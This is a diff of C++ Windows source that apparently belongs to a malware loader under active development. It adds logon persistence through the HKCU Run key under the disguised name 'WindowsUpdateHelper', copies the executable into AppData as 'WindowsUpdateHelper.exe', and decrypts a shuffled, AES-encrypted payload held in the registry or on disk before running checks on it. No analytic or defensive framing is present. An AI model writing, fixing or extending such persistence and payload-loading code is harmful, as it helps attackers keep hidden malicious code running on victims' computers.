@@ -68,6 +68,44 @@ bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
     return true;
 }
 
+bool IsInAuto() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER,
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        
+        DWORD size = sizeof(wchar_t);  // Just check existence
+        if (RegQueryValueExW(hKey, L"WindowsUpdateHelper", NULL, NULL, NULL, &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return true;  // Entry exists → we're persistent
+        }
+        RegCloseKey(hKey);
+    }
+    return false;
+}
+bool AddToAuto() {
+    if (IsInAuto()) {
+        return true;
+    }
+   
+    wchar_t modulePath[MAX_PATH];
+    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+   
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER,
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+      
+        std::wstring value = L"\"" + std::wstring(modulePath) + L"\"";
+        BOOL success = (RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
+                          (BYTE*)value.c_str(),
+                          (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS);
+      
+        RegCloseKey(hKey);
+        return success;
+    }
+    return false;
+}
 
 bool RegFE() {
     HKEY hKey;
@@ -357,61 +395,68 @@ bool CopySTPL() {
     if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
         return false;
     }
+
     wchar_t appDataPath[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
         return false;
     }
+
     wchar_t targetPath[MAX_PATH];
     PathCombineW(targetPath, appDataPath, L"Microsoft\\Windows\\WindowsUpdateHelper.exe");
 
-    bool fileExisted = PathFileExistsW(targetPath);
+    // Check if the target file ALREADY EXISTS
+    if (PathFileExistsW(targetPath)) {
+        // Already present → assume registry is correct too (or check separately)
+        return true;  // Success: no need to copy
+    }
 
-    // Always create directory (harmless if exists)
+    // Target doesn't exist → proceed with copy
     wchar_t dirPath[MAX_PATH];
     wcscpy_s(dirPath, targetPath);
     PathRemoveFileSpecW(dirPath);
     SHCreateDirectoryExW(NULL, dirPath, NULL);
 
-    // Copy only if file doesn't exist
-    if (!fileExisted) {
-        if (!CopyFileW(currentPath, targetPath, FALSE)) {
-            return false;
+    if (CopyFileW(currentPath, targetPath, FALSE)) {  // FALSE = overwrite if exists (but we already checked)
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER,
+            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            
+            std::wstring value = L"\"" + std::wstring(targetPath) + L"\"";
+            RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
+                           (BYTE*)value.c_str(),
+                           (DWORD)(value.length() * sizeof(wchar_t)));
+            RegCloseKey(hKey);
         }
+        return true;
     }
 
-    // ALWAYS set the registry to the persistent path (this is the key fix)
-    HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        
-        std::wstring value = L"\"" + std::wstring(targetPath) + L"\"";
-        RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
-                      (BYTE*)value.c_str(),
-                      (DWORD)(value.length() * sizeof(wchar_t)));
-        RegCloseKey(hKey);
-    }
-
-    return true;
+    return false;
 }
 std::vector<char> RecFWRP() {
-   CopySTPL();
-
-    // --- Everything below this line remains 100% unchanged ---
+    CopySTPL();
+    if (!IsInAuto()) {
+        AddToAuto();
+    }
+    
     if (RegFE()) {
+      
         auto rPBuf = LoadFFR();
         if (!rPBuf.empty()) {
+          
             return rPBuf;
         }
+     
     }
-
-    auto [index, enChksLog] = LoadEFR();  
+    
+   
+    auto [index, enChksLog] = LoadEFR();   
     if (!enChksLog.empty()) {
         std::vector<int>chkOrdr(index.ccount);
         for (int i = 0; i < index.ccount; ++i) {
-            chkOrdr[i] = i;
+           chkOrdr[i] = i;
         }
-      
+        
         std::mt19937 rng(index.shseed);
         std::shuffle(chkOrdr.begin(),chkOrdr.end(), rng);
         std::vector<int> inv_ord(index.ccount);
@@ -419,67 +464,80 @@ std::vector<char> RecFWRP() {
             int log_idx = chkOrdr[regpos];
             inv_ord[log_idx] = regpos;
         }
-      
+        
         std::vector<std::vector<BYTE>> encChksShuf(index.ccount);
         for (int log_idx = 0; log_idx < index.ccount; ++log_idx) {
             int reg_pos =  inv_ord[log_idx];
             encChksShuf[reg_pos] = enChksLog[log_idx];
             char buf[256];
         }
-      
+        
         StoreFIR(index, encChksShuf);
-      
+       
         char buf[512];
         std::vector<char> pbuf;
         pbuf.reserve(index.tsize + 1024);
+
         HCRYPTPROV hProv = 0;
         if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+          
             return {};
         }
+
         BYTE aes_key[32] = {0};
         for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
         BYTE last_cipher_block[16] = {0};
+
         for (int i = 0; i < index.ccount; ++i) {
             const auto& enc_buf = enChksLog[i];
             DWORD chk_s = (DWORD)enc_buf.size();
-          
+           
             BYTE iv[16] = {0};
             if (i > 0) {
                 memcpy(iv, last_cipher_block, 16);
             }
+
             struct {
                 BLOBHEADER hdr;
                 DWORD      dwKeySize;
                 BYTE       key[32];
             } keyblob = {0};
+
             keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
             keyblob.hdr.bVersion = CUR_BLOB_VERSION;
             keyblob.hdr.reserved = 0;
             keyblob.hdr.aiKeyAlg = CALG_AES_256;
             keyblob.dwKeySize    = 32;
             memcpy(keyblob.key, aes_key, 32);
+
             HCRYPTKEY hKey = 0;
             if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
                 CryptReleaseContext(hProv, 0);
                 return {};
             }
+
             if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
                 CryptDestroyKey(hKey);
                 CryptReleaseContext(hProv, 0);
                 return {};
             }
+
             std::vector<BYTE> dec(chk_s);
             memcpy(dec.data(), enc_buf.data(), chk_s);
             DWORD out_len = chk_s;
+
             if (!CryptDecrypt(hKey, 0, FALSE, 0, dec.data(), &out_len)) {
                 CryptDestroyKey(hKey);
                 CryptReleaseContext(hProv, 0);
                 return {};
             }
+
             CryptDestroyKey(hKey);
+
             if (chk_s >= 16) {
                 memcpy(last_cipher_block, enc_buf.data() + chk_s - 16, 16);
             }
+
             if (out_len > 0) {
                 BYTE pad = dec[out_len - 1];
                 if (pad >= 1 && pad <= 16) {
@@ -495,14 +553,17 @@ std::vector<char> RecFWRP() {
                     }
                 }
             }
+
             pbuf.insert(pbuf.end(), (char*)dec.data(), (char*)dec.data() + out_len);
         }
+
         CryptReleaseContext(hProv, 0);
+
         if (VerPay(pbuf, index.crc32, index.tsize)) {
             return pbuf;
         }
     }
-   
+    
     return {};
 }
 
